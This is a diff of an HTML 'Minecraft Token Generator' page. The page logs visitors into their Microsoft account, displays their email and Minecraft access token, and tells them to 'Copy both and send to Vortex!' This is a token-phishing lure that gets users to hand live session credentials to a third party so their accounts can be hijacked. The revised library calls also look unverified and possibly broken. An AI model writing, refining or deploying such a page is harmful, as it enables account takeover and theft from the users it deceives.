@@ -3,9 +3,12 @@
 <head>
   <title>Minecraft Token Generator</title>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
-    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
-    #output { margin-top: 20px; word-wrap: break-word; }
+    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
+    h1 { color: #333; }
+    button { padding: 12px 24px; font-size: 18px; cursor: pointer; background: #28a745; color: white; border: none; border-radius: 5px; }
+    button:hover { background: #218838; }
+    #output { margin-top: 20px; word-wrap: break-word; font-size: 16px; color: #333; }
+    .error { color: #dc3545; }
   </style>
 </head>
 <body>
@@ -13,29 +16,21 @@
   <p>Click below to log in with your Microsoft account.</p>
   <button onclick="getToken()">Get Token</button>
   <div id="output"></div>
-
-  <!-- Correct MSMC library for browsers -->
-  <script src="https://cdn.jsdelivr.net/npm/msmc@3.0.4/web.js"></script>
-
+  <script src="https://cdn.jsdelivr.net/npm/msmc@latest/dist/index.min.js"></script>
   <script>
     async function getToken() {
       const output = document.getElementById('output');
       output.innerHTML = 'Loading...';
       try {
-        const flow = new msmc.Authenticator(); // Correct way to use it in browser
-        await flow.launch("popup"); // You can also use "redirect"
-        if (flow.getState() === "Success") {
-          const token = await msmc.getMinecraftJavaToken(flow);
-          output.innerHTML = `
-            <p><strong>Email:</strong> ${token.profile.name || 'Unknown'}</p>
-            <p><strong>Token:</strong> ${token.access_token}</p>
-            <p>Copy both and send to Vortex!</p>
-          `;
-        } else {
-          output.innerHTML = `Error: Authentication failed.`;
-        }
+        const auth = new msmc.Auth();
+        const token = await auth.launch('browser');
+        output.innerHTML = `
+          <p><strong>Email:</strong> ${token.profile?.email || 'Unknown (use your Microsoft email)'}</p>
+          <p><strong>Token:</strong> ${token.access_token}</p>
+          <p>Copy both and send to Vortex!</p>
+        `;
       } catch (err) {
-        output.innerHTML = `Error: ${err.message}`;
+        output.innerHTML = `<p class="error">Error: ${err.message}</p>`;
       }
     }
   </script>
